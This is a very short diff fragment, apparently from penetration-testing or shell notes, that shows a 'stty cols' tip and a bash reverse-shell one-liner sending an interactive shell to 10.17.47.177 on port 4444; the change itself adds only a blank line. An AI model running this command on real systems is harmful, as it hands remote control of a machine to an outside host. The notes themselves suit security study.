@@ -50,3 +50,4 @@ and
 `stty cols <number>`
 
 bash -i >& /dev/tcp/10.17.47.177/4444 0>&1
+
